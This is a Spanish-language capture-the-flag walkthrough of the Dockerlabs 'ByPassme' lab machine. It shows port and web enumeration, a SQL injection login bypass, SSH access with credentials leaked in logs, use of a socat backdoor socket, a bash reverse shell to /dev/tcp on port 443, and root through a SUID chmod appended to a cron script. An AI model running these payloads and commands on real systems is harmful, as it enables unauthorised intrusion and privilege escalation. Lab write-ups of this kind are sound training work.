
# Writeup Template: Maquina `[ ByPassme ]`

- Tags: #ByPassme
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina ByPassme](https://mega.nz/file/jYlh1aaB#mIA3crjgCCq5sUtfUsjJAT7c-0ZU8Mdo3r-EugJJhus)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x bypassme.zip
sudo bash auto_deploy.sh bypassme.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py [IP_TARGET]
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
1. `[ 22 ]/[ TCP ]`: [ SSH ] ([ 9.6 ])
2. `[ 80 ]/[ TCP ]`: [ Apache ] ([ 2.4.58 ]) **ubuntuNoble**
---

## Enumeracion de [Servicio  Principal]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://[IP_TARGET]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Resultado:
```bash
/login.php: Possible admin folder
PHPSESSID: 
  httponly flag not set
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
No reporto nada relevante

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x sh,php,php.back,txt,html,js
```

- **Hallazgos**:
No reporto nada relevante

Tenemos un panel de inicio de sesion el cual probaremos un ataque de **SQLInjection**
```bash
username: admin' or '1'='1
password: admin' or '1'='1 # Este es el campo vulnerable
```

Una ves estando logueados encontramos informacion valiosa: Indican que los logs estan expuestos en una carpeta publica que aun no sabemos cual es:
```bash
To manage users or view logs, please use the navigation bar (coming soon... 👀)

[!] Warning: System error logs are exposed to the public folder
```

Tenemos datos sobre que se tiene que asegurar el archivo **logs.txt** antes de ser desplegado:
```bash
<!-- dev note: remember to secure logs.txt path before deploy -->
```

Despues de aplicar **Fuzzing** encontramos esta ruta de los logs:
```bash
http://172.17.0.2/index.php?page=/logs/logs.txt
```

Aqui podemos ver los intentos de session en el sistema el cual contempla:
```bash
[2024-03-29 12:04:23] ERROR: Login attempt for user 'albert'
[2024-03-29 12:04:24] DEBUG: Trying password 'NGxiM3J0MTIz'
[2024-03-29 12:04:25] SUCCESS: Auth success for user 'albert'
[2024-03-29 12:04:26] DEBUG: Session token issued: 38b2fdcbffe78b9989f3e
```
### Credenciales Encontradas
- Usuario: `[ albert ]`
- Contraseña: `[ NGxiM3J0MTIz ]`

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos acceso a los logs del sistema podremos loguearnos por ssh con las credenciales expuestas: 

### Intrusion
En este caso la intrusion sera por **ssh**

```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh albert@172.17.0.2 ( NGxiM3J0MTIz ) 
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
ps -faux
```

Listando los procesos del sistenam tenemos este proceos que ejecuta el usuario **conx**
```bash
conx          54  0.0  0.0   9288  3620 ?        S    17:10   0:00 socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /bin/bash ]`
- Credenciales de usuario: `[ conx ]:[ ]`

**Nota**: El proceso que vemos indica la presencia de una **backdoor**
1. **Backdoor activa**:
    - Alguien creó un socket Unix oculto (`/home/conx/.cache/.sock`)
    - Cualquier usuario con acceso al sistema puede conectarse para obtener una shell de bash

### Explotacion de Privilegios

###### Usuario `[ albert ]`:

Ahora usamos este comando que nos da acceso inmediato a una terminar interactiva como el usuario **conx**
```bash
# Comando para escalar al usuario: ( conx )
socat - UNIX-CONNECT:/home/conx/.cache/.sock
```

Nos ponemos en escucha:
```bash
nc -nlvp 443
```

Ahora que tenemos la sesion nos enviaremos una **revershell** 
```bash
bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'
```

Ya tenemos una bash en nuestra maquina de atacante, Ahora revisaremos las tareas **cron** del sistema
```bash
cat /etc/cron.d/backup-cron
```

Vemos que se esta ejecutando la siguiente tarea:
```bash
* * * * * root bash /var/backups/backup.sh
```

Ahora colaremos una instruccion que de permisos **SUID** a la bash
```bash
echo "chmod u+s /bin/bash" >> /var/backups/backup.sh
```

Solo tenemos que esperar a que se carguen los permisos
```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Elevamos privilegios de **root**
```bash
bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos como es una **backdor** activa en un sistema
2. Aprendimos a explotar una **backdor**
3. Aplicamos **SQLInjection** al panel de sesion

## Recomendaciones de Seguridad
- Aplicar validaciones al loin de inicio de sesion
- Evitar tareas **cron** con privilegios